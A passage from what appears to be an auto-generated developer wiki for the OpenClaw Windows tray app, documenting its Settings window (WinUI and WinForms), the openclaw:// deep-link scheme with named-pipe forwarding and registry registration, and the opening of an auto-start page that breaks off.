    subgraph "Testing Infrastructure"
        TestClient["OpenClawGatewayClient<br/>Connection test"]
        TestLogger["TestLogger<br/>IOpenClawLogger stub"]
        ToastBuilder["ToastContentBuilder<br/>Notification test"]
    end
    
    WinUIWindow --> WinUICode
    WinFormsDialog --> WinFormsCode
    
    WinUICode --> SettingsMgr
    WinFormsCode --> SettingsMgr
    
    WinUICode --> GatewayUrlHelper
    WinFormsCode --> GatewayUrlHelper
    
    WinUICode --> TestClient
    WinFormsCode --> TestClient
    
    WinUICode --> ToastBuilder
    WinFormsCode --> ToastBuilder
    
    SettingsMgr --> AutoStartMgr
    AutoStartMgr --> Registry
    
    TestClient --> TestLogger
```

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:1-196](), [src/OpenClaw.Tray/SettingsDialog.cs:1-336]()

---

## Dual Implementation Strategy

The application maintains two parallel implementations of the Settings Window to support both modern and legacy Windows deployments.

| Implementation | Technology | File | Window Type | Key Features |
|---------------|------------|------|-------------|--------------|
| **Modern** | WinUI 3 | `SettingsWindow.xaml` / `.cs` | `WindowEx` (WinUIEx) | Mica backdrop, modern controls, XAML data binding |
| **Legacy** | WinForms | `SettingsDialog.cs` | `ModernForm` | Custom-drawn modern styling, broader compatibility |

Both implementations:
- Load settings from the same `SettingsManager` instance
- Use identical validation logic via `GatewayUrlHelper`
- Support connection testing with `OpenClawGatewayClient`
- Trigger the same system integration side effects (registry updates)

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:1-117](), [src/OpenClaw.Tray/SettingsDialog.cs:9-41]()

---

## User Interface Layout

The Settings Window organizes configuration options into four distinct sections, presented in a vertical scrollable layout.

**WinUI Settings Window Layout Structure**

```mermaid
graph TB
    Window["SettingsWindow<br/>(WindowEx)"]
    
    subgraph Grid["Grid Layout"]
        ScrollViewer["ScrollViewer<br/>Vertical scrolling"]
        Footer["Border<br/>Fixed footer"]
    end
    
    subgraph Content["StackPanel (MaxWidth=450)"]
        ConnSection["CONNECTION Section"]
        StartupSection["STARTUP Section"]
        NotifSection["NOTIFICATIONS Section"]
        AdvSection["ADVANCED Section"]
    end
    
    subgraph ConnControls["Connection Controls"]
        GatewayUrlTB["GatewayUrlTextBox<br/>TextBox"]
        TokenTB["TokenTextBox<br/>TextBox"]
        TestBtn["TestConnectionButton<br/>Button"]
        StatusLbl["StatusLabel<br/>TextBlock"]
    end
    
    subgraph StartupControls["Startup Controls"]
        AutoStartTS["AutoStartToggle<br/>ToggleSwitch"]
        HotkeyTS["GlobalHotkeyToggle<br/>ToggleSwitch"]
    end
    
    subgraph NotifControls["Notification Controls"]
        NotifTS["NotificationsToggle<br/>ToggleSwitch"]
        SoundCB["NotificationSoundComboBox<br/>ComboBox"]
        Filters["8 CheckBoxes<br/>Health, Urgent, etc."]
        TestNotifBtn["TestNotificationButton<br/>Button"]
    end
    
    subgraph AdvControls["Advanced Controls"]
        NodeModeTS["NodeModeToggle<br/>ToggleSwitch"]
    end
    
    subgraph FooterControls["Footer Buttons"]
        CancelBtn["Cancel Button"]
        SaveBtn["Save Button<br/>AccentButtonStyle"]
    end
    
    Window --> Grid
    Grid --> ScrollViewer
    Grid --> Footer
    
    ScrollViewer --> Content
    Content --> ConnSection
    Content --> StartupSection
    Content --> NotifSection
    Content --> AdvSection
    
    ConnSection --> ConnControls
    StartupSection --> StartupControls
    NotifSection --> NotifControls
    AdvSection --> AdvControls
    
    Footer --> FooterControls
```

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:14-115]()

---

## Connection Section

The Connection section handles gateway URL and authentication token configuration, with built-in validation and testing capabilities.

### Gateway URL Input

The `GatewayUrlTextBox` accepts WebSocket URLs in the format:
- `ws://localhost:18789` (default local gateway)
- `wss://host.tailnet.ts.net` (secure remote gateway)
- URLs with embedded credentials: `ws://token@host:port`

### Connection Testing

The "Test" button initiates an asynchronous connection test using a temporary `OpenClawGatewayClient` instance.

**Connection Test Flow (WinUI)**

```mermaid
sequenceDiagram
    participant User
    participant OnTestConnection["OnTestConnection()<br/>Event Handler"]
    participant GatewayUrlHelper
    participant TestClient["OpenClawGatewayClient<br/>(temp instance)"]
    participant StatusLabel
    
    User->>OnTestConnection: Click "Test" button
    OnTestConnection->>GatewayUrlHelper: IsValidGatewayUrl()
    
    alt Invalid URL
        GatewayUrlHelper-->>OnTestConnection: false
        OnTestConnection->>StatusLabel: "❌ {ValidationMessage}"
    else Valid URL
        OnTestConnection->>StatusLabel: "Testing..."
        OnTestConnection->>TestClient: new OpenClawGatewayClient()
        OnTestConnection->>TestClient: ConnectAsync()
        
        TestClient->>TestClient: StatusChanged event
        
        alt Connected
            TestClient-->>OnTestConnection: status = Connected
            OnTestConnection->>StatusLabel: "✅ Connected!"
        else Error or Timeout
            TestClient-->>OnTestConnection: status = Error / Timeout
            OnTestConnection->>StatusLabel: "❌ Connection failed"
        end
        
        OnTestConnection->>TestClient: Dispose()
    end
```

**Implementation Details:**

The test creates a `TaskCompletionSource<bool>` and subscribes to the `StatusChanged` event, waiting up to 5 seconds for connection status:

```
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:98-153]()
```

Key behaviors:
- Uses a stub `TestLogger` that discards all log messages
- Disables the test button during testing to prevent multiple concurrent tests
- Waits maximum 5 seconds before timing out
- Properly disposes the client after testing

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:98-153](), [src/OpenClaw.Tray/SettingsDialog.cs:277-305]()

---

## Startup Section

Configures application behavior at Windows startup and provides global hotkey registration.

### Auto-Start Toggle

The `AutoStartToggle` controls whether the application launches automatically when Windows starts. When saved, this setting triggers a registry update via `AutoStartManager.SetAutoStart()`:

```
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:95]()
```

The registry key modified is `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.

### Global Hotkey Toggle

The `GlobalHotkeyToggle` enables/disables the **Ctrl+Alt+Shift+C** system-wide hotkey that opens the Quick Send dialog. This setting is read by the main application during initialization and hotkey registration.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:44-50](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:38-39,73-74]()

---

## Notifications Section

Provides comprehensive control over desktop notification behavior with a master toggle, sound selection, and granular message type filtering.

### Master Toggle

The `NotificationsToggle` controls the global notification display. When disabled, no toast notifications appear regardless of filter settings.

### Notification Sound

The `NotificationSoundComboBox` offers four sound options:

| Option | Description |
|--------|-------------|
| **Default** | System default notification sound |
| **None** | Silent notifications |
| **Subtle** | Minimal sound (WinUI only) |
| **Critical** / **Information** | Alternative sounds (WinForms) |

### Notification Filters

Eight checkboxes control which message types trigger notifications. Each filter uses keyword matching against message content:

**Notification Filter Mapping**

```mermaid
graph LR
    subgraph "UI Controls"
        HealthCB["NotifyHealthCb<br/>CheckBox"]
        UrgentCB["NotifyUrgentCb<br/>CheckBox"]
        ReminderCB["NotifyReminderCb<br/>CheckBox"]
        EmailCB["NotifyEmailCb<br/>CheckBox"]
        CalendarCB["NotifyCalendarCb<br/>CheckBox"]
        BuildCB["NotifyBuildCb<br/>CheckBox"]
        StockCB["NotifyStockCb<br/>CheckBox"]
        InfoCB["NotifyInfoCb<br/>CheckBox"]
    end
    
    subgraph "SettingsManager Properties"
        HealthProp["NotifyHealth"]
        UrgentProp["NotifyUrgent"]
        ReminderProp["NotifyReminder"]
        EmailProp["NotifyEmail"]
        CalendarProp["NotifyCalendar"]
        BuildProp["NotifyBuild"]
        StockProp["NotifyStock"]
        InfoProp["NotifyInfo"]
    end
    
    HealthCB --> HealthProp
    UrgentCB --> UrgentProp
    ReminderCB --> ReminderProp
    EmailCB --> EmailProp
    CalendarCB --> CalendarProp
    BuildCB --> BuildProp
    StockCB --> StockProp
    InfoCB --> InfoProp
```

Each filter defaults to `true` (enabled) and is evaluated when incoming notifications are received.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:52-81](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:56-63,82-89]()

### Test Notification Button

The `TestNotificationButton` sends a sample toast notification to verify that the notification system is working correctly:

```
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:155-168]()
```

This creates a simple two-line toast using `ToastContentBuilder` from the Microsoft Toolkit library.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:155-168](), [src/OpenClaw.Tray/SettingsDialog.cs:212-225]()

---

## Advanced Section

Houses experimental features that are not recommended for general use.

### Node Mode Toggle

The `NodeModeToggle` enables Node Mode, which allows the Windows PC to act as a remotely controllable agent. When enabled:

1. The application connects to the gateway as a node client
2. Capabilities are registered (system, canvas, screen, camera)
3. The PC can receive and execute remote commands

The toggle includes a warning label:
> "When enabled, this PC can receive commands from the agent (canvas, screenshots, etc.)"

This setting is critical for security and is marked as EXPERIMENTAL.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:87-98](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:66,92]()

For detailed information about Node Mode functionality, see [Node Mode](#4).

---

## Settings Persistence Flow

The window manages settings through distinct load and save operations that interact with the shared configuration system.

**Settings Window Data Flow**

```mermaid
sequenceDiagram
    participant User
    participant Window["SettingsWindow /<br/>SettingsDialog"]
    participant LoadSettings["LoadSettings()"]
    participant SaveSettings["SaveSettings()"]
    participant SettingsMgr["SettingsManager"]
    participant Validation["GatewayUrlHelper"]
    participant AutoStartMgr["AutoStartManager"]
    participant Registry["Windows Registry"]
    participant AppDataFile["settings.json"]
    
    Note over User,Window: Window Opening
    
    User->>Window: Open settings
    Window->>Window: Constructor()
    Window->>LoadSettings: LoadSettings()
    LoadSettings->>SettingsMgr: Read properties<br/>GatewayUrl, Token, etc.
    SettingsMgr->>AppDataFile: Load from disk
    AppDataFile-->>SettingsMgr: JSON data
    SettingsMgr-->>LoadSettings: Property values
    LoadSettings->>Window: Populate UI controls
    
    Note over User,Window: User Editing
    
    User->>Window: Modify settings
    User->>Window: Click "Save"
    
    Window->>Validation: IsValidGatewayUrl()
    
    alt Invalid URL
        Validation-->>Window: false + ValidationMessage
        Window->>User: Show error in StatusLabel
    else Valid URL
        Window->>SaveSettings: SaveSettings()
        SaveSettings->>SettingsMgr: Set properties
        SettingsMgr->>SettingsMgr: Save()
        SettingsMgr->>AppDataFile: Write JSON
        SaveSettings->>AutoStartMgr: SetAutoStart()
        AutoStartMgr->>Registry: Update HKCU\Run
        SaveSettings->>Window: SettingsSaved event
        Window->>User: Close window
    end
```

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:34-96,170-182]()

---

## Method Reference

### SettingsWindow (WinUI)

| Method | Parameters | Description |
|--------|-----------|-------------|
| `SettingsWindow()` | `SettingsManager settings` | Constructor that initializes window, sets icon, centers on screen |
| `LoadSettings()` | - | Reads all settings from `SettingsManager` and populates UI controls |
| `SaveSettings()` | - | Writes UI control values to `SettingsManager` and persists to disk |
| `OnTestConnection()` | `object sender, RoutedEventArgs e` | Validates URL and tests WebSocket connection to gateway |
| `OnTestNotification()` | `object sender, RoutedEventArgs e` | Sends sample toast notification |
| `OnSave()` | `object sender, RoutedEventArgs e` | Validates inputs, saves settings, fires `SettingsSaved` event |
| `OnCancel()` | `object sender, RoutedEventArgs e` | Closes window without saving |

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:12-196]()

### SettingsDialog (WinForms)

The WinForms implementation provides equivalent methods with WinForms-specific signatures:

| Method | Parameters | Description |
|--------|-----------|-------------|
| `SettingsDialog()` | `SettingsManager settings` | Constructor with custom form initialization |
| `InitializeComponent()` | - | Programmatically creates and positions all UI controls |
| `LoadSettings()` | - | Identical functionality to WinUI version |
| `SaveSettings()` | - | Identical functionality to WinUI version |
| `OnTestConnection()` | `object? sender, EventArgs e` | Async connection test with WinForms error handling |
| `OnTestNotification()` | `object? sender, EventArgs e` | Toast notification test with fallback error dialog |
| `MakeFilterCb()` | `string text, int x, int y` | Helper to create positioned notification filter checkboxes |
| `OnOkClick()` | `object? sender, EventArgs e` | Validates and saves, sets `DialogResult.OK` |
| `OnCancelClick()` | `object? sender, EventArgs e` | Sets `DialogResult.Cancel` and closes |

**Sources:** [src/OpenClaw.Tray/SettingsDialog.cs:36-335]()

---

## Window Configuration

### WinUI Window Properties

```
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:25-27]()
```

- **Size:** 480×700 pixels (set via `SetWindowSize()`)
- **Position:** Centered on screen (via `CenterOnScreen()`)
- **Icon:** Uses current connection status icon
- **Backdrop:** Mica material (system backdrop)
- **Min Size:** 400×500 pixels (XAML constraint)

### WinForms Dialog Properties

```
[src/OpenClaw.Tray/SettingsDialog.cs:45-49]()
```

- **Size:** 480×600 pixels
- **ShowInTaskbar:** `false` (modal dialog behavior)
- **Icon:** Lobster icon (via `IconHelper.GetLobsterIcon()`)
- **Style:** Custom `ModernForm` with manual control styling

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml:7-12](), [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:24-28](), [src/OpenClaw.Tray/SettingsDialog.cs:44-49]()

---

## Event Handling

### SettingsSaved Event

Both implementations raise a `SettingsSaved` event when the user successfully saves changes:

```
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:17,180]()
```

This event allows the main application to respond to configuration changes, such as:
- Reconnecting to a new gateway URL
- Re-registering the global hotkey
- Enabling/disabling Node Mode

The WinForms version uses the standard `DialogResult` pattern instead of a custom event.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:17,180](), [src/OpenClaw.Tray/SettingsDialog.cs:326-327]()

---

## Validation Rules

Settings validation occurs at two points: during connection testing and before saving.

### Gateway URL Validation

Uses `GatewayUrlHelper.IsValidGatewayUrl()` to ensure:
- URL is not empty or whitespace
- Scheme is `ws://` or `wss://`
- Host is specified
- Port is valid (if specified)

Validation errors are displayed in the `StatusLabel` with the message from `GatewayUrlHelper.ValidationMessage`.

### Required Fields

- **Gateway URL:** Required, must pass validation
- **Token:** Optional (can be empty for unauthenticated gateways)
- All other settings have default values

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:101-104,172-177](), [src/OpenClaw.Tray/SettingsDialog.cs:309-323]()

---

## Integration Points

The Settings Window integrates with several system components when settings are saved.

### Registry Integration

When `AutoStart` changes, `AutoStartManager.SetAutoStart()` is called to update the Windows Registry:

```
[src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:95]()
```

This creates or removes a registry entry at `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` with the application executable path.

### Hotkey Registration

Changes to `GlobalHotkeyEnabled` require the application to re-register or unregister the system-wide **Ctrl+Alt+Shift+C** hotkey. This happens after the window closes when the main application receives the `SettingsSaved` event.

### Node Mode Activation

When `EnableNodeMode` is toggled, the main application must start or stop the `WindowsNodeClient` and capability registration. This is handled by the main application after receiving the settings change notification.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/SettingsWindow.xaml.cs:69-96]()

---

# Page: Deep Links & URI Schemes

# Deep Links & URI Schemes

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/workflows/ci.yml](.github/workflows/ci.yml)
- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs](src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)

</details>



This page documents the `openclaw://` URI scheme implementation, which enables external applications, browser links, and command-line invocations to trigger specific actions within the OpenClaw Windows Hub. The system supports both MSIX-packaged protocol activation and traditional registry-based URI handling.

For information about application startup and lifecycle management, see [Application Lifecycle](#2.1). For settings configuration, see [Settings Window](#5.1). For system integration features like auto-start, see [Auto-Start & System Integration](#5.3).

---

## URI Scheme Overview

The application registers the `openclaw://` URI scheme to handle deep links from external sources:

```
openclaw://settings
openclaw://chat
openclaw://dashboard
openclaw://dashboard/sessions/main
openclaw://send?message=Hello
openclaw://agent?message=Run%20task
```

The URI scheme enables scenarios like:
- Opening specific windows from browser links
- Triggering actions from PowerToys Command Palette
- Sending messages via command-line scripts
- Cross-application integration with other tools

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:1-129]()

---

## URI Scheme Registration

### Registration Modes

The application uses different registration mechanisms depending on packaging:

```mermaid
graph TB
    Start["Application Launch"]
    CheckPackaged{"IsPackaged?"}
    MSIXMode["MSIX Mode"]
    UnpackagedMode["Unpackaged Mode"]
    MSIXManifest["Package.appxmanifest<br/>declares protocol"]
    RegistryWrite["Write to<br/>HKCU\\SOFTWARE\\Classes\\openclaw"]
    WindowsHandles["Windows handles<br/>protocol activation"]
    
    Start --> CheckPackaged
    CheckPackaged -->|"Yes"| MSIXMode
    CheckPackaged -->|"No"| UnpackagedMode
    MSIXMode --> MSIXManifest
    UnpackagedMode --> RegistryWrite
    MSIXManifest --> WindowsHandles
    RegistryWrite --> WindowsHandles
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:15-44]()

### MSIX Protocol Declaration

MSIX-packaged builds declare the protocol in `Package.appxmanifest`:

```xml
<uap:Protocol Name="openclaw">
  <uap:DisplayName>OpenClaw Protocol</uap:DisplayName>
</uap:Protocol>
```

The registration check prevents duplicate registry writes:

```csharp
if (Helpers.PackageHelper.IsPackaged)
{
    Logger.Info("URI scheme handled by MSIX manifest (packaged mode)");
    return;
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:17-22]()

### Registry-Based Registration

For unpackaged (portable EXE) builds, the `DeepLinkHandler.RegisterUriScheme()` method writes registry keys:

| Registry Key | Value | Purpose |
|--------------|-------|---------|
| `HKCU\SOFTWARE\Classes\openclaw` | `URL:OpenClaw Protocol` | Protocol description |
| `HKCU\SOFTWARE\Classes\openclaw` (URL Protocol) | Empty string | Marks as URI scheme |
| `openclaw\DefaultIcon` | `"{exePath}",0` | Icon for protocol links |
| `openclaw\shell\open\command` | `"{exePath}" "%1"` | Command to execute |

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:24-44]()

---

## Deep Link Paths

### Supported Deep Link Routes

The `DeepLinkHandler.Handle()` method routes URIs to application actions:

```mermaid
graph LR
    URI["openclaw://..."]
    
    Settings["openclaw://settings"]
    Chat["openclaw://chat"]
    Dashboard["openclaw://dashboard"]
    DashboardPath["openclaw://dashboard/{path}"]
    Send["openclaw://send?message={msg}"]
    Agent["openclaw://agent?message={msg}"]
    
    SettingsWindow["ShowSettings()"]
    ChatWindow["ShowWebChat()"]
    BrowserDash["OpenDashboard(null)"]
    BrowserPath["OpenDashboard(path)"]
    QuickSendDialog["ShowQuickSend(message)"]
    SendMsg["SendChatMessage(message)"]
    
    URI --> Settings
    URI --> Chat
    URI --> Dashboard
    URI --> DashboardPath
    URI --> Send
    URI --> Agent
    
    Settings --> SettingsWindow
    Chat --> ChatWindow
    Dashboard --> BrowserDash
    DashboardPath --> BrowserPath
    Send --> QuickSendDialog
    Agent --> SendMsg
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:46-105]()

### Path Parsing and Routing

Deep link parsing extracts path and query components:

```csharp
var path = uri["openclaw://".Length..].TrimEnd('/');
var queryIndex = path.IndexOf('?');
var query = queryIndex >= 0 ? path[(queryIndex + 1)..] : "";
path = queryIndex >= 0 ? path[..queryIndex] : path;
```

Routing uses pattern matching:

| Pattern | Action | Example |
|---------|--------|---------|
| `settings` | Open Settings window | `openclaw://settings` |
| `chat` | Open WebChat window | `openclaw://chat` |
| `dashboard` | Open dashboard in browser | `openclaw://dashboard` |
| `dashboard/{path}` | Open specific dashboard path | `openclaw://dashboard/sessions/main` |
| `send` | Open Quick Send dialog | `openclaw://send?message=Hello` |
| `agent` | Send message directly | `openclaw://agent?message=Task` |

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:51-105]()

### Query Parameter Extraction

The `GetQueryParam()` helper parses URL-encoded query strings:

```csharp
private static string? GetQueryParam(string query, string key)
{
    foreach (var part in query.Split('&', StringSplitOptions.RemoveEmptyEntries))
    {
        var kv = part.Split('=', 2);
        if (kv.Length == 2 && kv[0].Equals(key, StringComparison.OrdinalIgnoreCase))
        {
            return Uri.UnescapeDataString(kv[1]);
        }
    }
    return null;
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:107-118]()

---

## Single-Instance Enforcement and Forwarding

### Single-Instance Architecture

The application enforces single-instance behavior using a named `Mutex` and forwards deep links to the running instance via named pipes:

```mermaid
sequenceDiagram
    participant User
    participant SecondInstance as "Second Instance<br/>(New Process)"
    participant Mutex as "Mutex<br/>OpenClawTray"
    participant Pipe as "Named Pipe<br/>OpenClawTray-DeepLink"
    participant FirstInstance as "First Instance<br/>(Running Process)"
    participant DeepLinkServer as "DeepLinkServer<br/>(Background Thread)"
    
    User->>SecondInstance: Launch with openclaw://chat
    SecondInstance->>Mutex: Acquire (createNew)
    Mutex-->>SecondInstance: Already owned (createdNew=false)
    SecondInstance->>Pipe: Connect + Write "openclaw://chat"
    Pipe->>DeepLinkServer: Receive URI
    DeepLinkServer->>FirstInstance: HandleDeepLink("openclaw://chat")
    FirstInstance->>User: Show WebChat window
    SecondInstance->>SecondInstance: Exit()
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:218-230]()

### Mutex-Based Detection

Single-instance check during `OnLaunched`:

```csharp
_mutex = new Mutex(true, "OpenClawTray", out bool createdNew);
if (!createdNew)
{
    // Forward deep link args to running instance
    var deepLink = protocolUri
        ?? (_startupArgs.Length > 1 && _startupArgs[1].StartsWith("openclaw://")
            ? _startupArgs[1] : null);
    if (deepLink != null)
    {
        SendDeepLinkToRunningInstance(deepLink);
    }
    Exit();
    return;
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:218-230]()

### Named Pipe Communication

IPC implementation details:

| Component | Value | Purpose |
|-----------|-------|---------|
| Pipe Name | `OpenClawTray-DeepLink` | IPC channel identifier |
| Pipe Direction | `PipeDirection.Out` (sender) / `In` (server) | Unidirectional client→server |
| Message Format | Raw URI string | UTF-8 encoded deep link |
| Connection Timeout | 2000ms | Max wait for running instance |

The sender (`SendDeepLinkToRunningInstance`) connects and writes the URI:

```csharp
private static void SendDeepLinkToRunningInstance(string uri)
{
    try
    {
        using var client = new NamedPipeClientStream(".", PipeName, PipeDirection.Out);
        client.Connect(2000);
        var bytes = Encoding.UTF8.GetBytes(uri);
        client.Write(bytes, 0, bytes.Length);
        Logger.Info($"Forwarded deep link to running instance: {uri}");
    }
    catch (Exception ex)
    {
        Logger.Warn($"Failed to forward deep link: {ex.Message}");
    }
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:1580-1594]()

### Deep Link Server Thread

The running instance listens on the named pipe in a background thread:

```csharp
private void StartDeepLinkServer()
{
    _deepLinkCts = new CancellationTokenSource();
    _ = Task.Run(async () =>
    {
        while (!_deepLinkCts.Token.IsCancellationRequested)
        {
            try
            {
                using var server = new NamedPipeServerStream(PipeName, PipeDirection.In);
                await server.WaitForConnectionAsync(_deepLinkCts.Token);
                
                var buffer = new byte[4096];
                var count = await server.ReadAsync(buffer, 0, buffer.Length, _deepLinkCts.Token);
                var uri = Encoding.UTF8.GetString(buffer, 0, count);
                
                _dispatcherQueue?.TryEnqueue(() => HandleDeepLink(uri));
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Logger.Error($"Deep link server error: {ex.Message}");
                await Task.Delay(1000);
            }
        }
    }, _deepLinkCts.Token);
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:1596-1627]()

---

## Protocol Activation Detection

### MSIX Protocol Activation

MSIX-packaged apps receive protocol activation through `AppInstance`:

```csharp
private static string? GetProtocolActivationUri()
{
    try
    {
        var activatedArgs = Microsoft.Windows.AppLifecycle.AppInstance.GetCurrent()
            .GetActivatedEventArgs();
        if (activatedArgs.Kind == ExtendedActivationKind.Protocol
            && activatedArgs.Data is IProtocolActivatedEventArgs protocolArgs)
        {
            return protocolArgs.Uri?.ToString();
        }
    }
    catch { /* Not activated via protocol, or not packaged */ }
    return null;
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:194-207]()

### Command-Line Activation

Unpackaged builds receive deep links as command-line arguments:

```csharp
_startupArgs = Environment.GetCommandLineArgs();

var startupDeepLink = _pendingProtocolUri
    ?? (_startupArgs.Length > 1 && _startupArgs[1].StartsWith("openclaw://")
        ? _startupArgs[1] : null);
if (startupDeepLink != null)
{
    HandleDeepLink(startupDeepLink);
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:290-297]()

---

## Deep Link Action Routing

### DeepLinkActions Class

The `DeepLinkActions` class provides action delegates for routing:

```csharp
public class DeepLinkActions
{
    public Action? OpenSettings { get; set; }
    public Action? OpenChat { get; set; }
    public Action<string?>? OpenDashboard { get; set; }
    public Action<string?>? OpenQuickSend { get; set; }
    public Func<string, Task>? SendMessage { get; set; }
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:121-128]()

### Application-Level Routing

The `App` class wires up actions during `HandleDeepLink`:

```csharp
private void HandleDeepLink(string uri)
{
    var actions = new DeepLinkActions
    {
        OpenSettings = ShowSettings,
        OpenChat = ShowWebChat,
        OpenDashboard = OpenDashboard,
        OpenQuickSend = (msg) => ShowQuickSend(msg),
        SendMessage = async (msg) =>
        {
            if (_gatewayClient != null)
                await _gatewayClient.SendChatMessageAsync(msg);
        }
    };
    
    DeepLinkHandler.Handle(uri, actions);
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:1653-1668]()

### Action Invocation Flow

```mermaid
graph TB
    DeepLink["Deep Link URI<br/>openclaw://send?message=Hello"]
    Handler["DeepLinkHandler.Handle()"]
    Parse["Parse path + query"]
    MatchSend["Match 'send' path"]
    ExtractQuery["GetQueryParam('message')"]
    InvokeAction["actions.OpenQuickSend('Hello')"]
    ShowDialog["App.ShowQuickSend('Hello')"]
    CreateWindow["new QuickSendDialog()"]
    
    DeepLink --> Handler
    Handler --> Parse
    Parse --> MatchSend
    MatchSend --> ExtractQuery
    ExtractQuery --> InvokeAction
    InvokeAction --> ShowDialog
    ShowDialog --> CreateWindow
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:46-105](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:1653-1668]()

---

## Deep Link Examples

### Common Usage Patterns

| Use Case | Deep Link | Result |
|----------|-----------|--------|
| Open settings | `openclaw://settings` | Opens Settings window |
| Open web chat | `openclaw://chat` | Opens WebView2 chat window |
| Open dashboard | `openclaw://dashboard` | Opens dashboard in default browser |
| View session | `openclaw://dashboard/sessions/main` | Opens specific session in browser |
| Quick send preset | `openclaw://send?message=Status%20update` | Opens Quick Send with pre-filled text |
| Send immediately | `openclaw://agent?message=Run%20backup` | Sends message directly to gateway |

### Browser Integration

HTML links can trigger deep link actions:

```html
<a href="openclaw://chat">Open Chat</a>
<a href="openclaw://dashboard/sessions/main">View Main Session</a>
<a href="openclaw://send?message=Hello">Quick Send</a>
```

### Command-Line Integration

Scripts can invoke deep links:

```batch
REM Open settings
start openclaw://settings

REM Send a message
start openclaw://agent?message=Deploy%20to%20production
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:46-105]()

---

## Error Handling

### Unknown Path Handling

Unrecognized deep link paths are logged and ignored:

```csharp
default:
    Logger.Warn($"Unknown deep link path: {path}");
    break;
```

### Registration Failures

Registry write failures are logged but do not prevent startup:

```csharp
catch (Exception ex)
{
    Logger.Warn($"Failed to register URI scheme: {ex.Message}");
}
```

### IPC Failures

Named pipe connection failures log warnings but allow graceful degradation:

```csharp
catch (Exception ex)
{
    Logger.Warn($"Failed to forward deep link: {ex.Message}");
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:40-43](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:1591-1593]()

---

## Integration with Build System

### MSIX Manifest Configuration

The CI/CD pipeline builds MSIX packages that declare the `openclaw://` protocol:

```yaml
- name: Build MSIX Package
  run: >
    msbuild src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj
    /p:PackageMsix=true
    /p:GenerateAppxPackageOnBuild=true
```

MSIX packages automatically register the protocol on installation without requiring registry writes.

**Sources:** [.github/workflows/ci.yml:144-156]()

### Portable EXE Registration

Portable builds (ZIP archives) register the protocol on first launch via `RegisterUriScheme()` during application startup:

```csharp
// Register URI scheme on first run
DeepLinkHandler.RegisterUriScheme();
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:237]()

---

# Page: Auto-Start & System Integration

# Auto-Start & System Integration

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

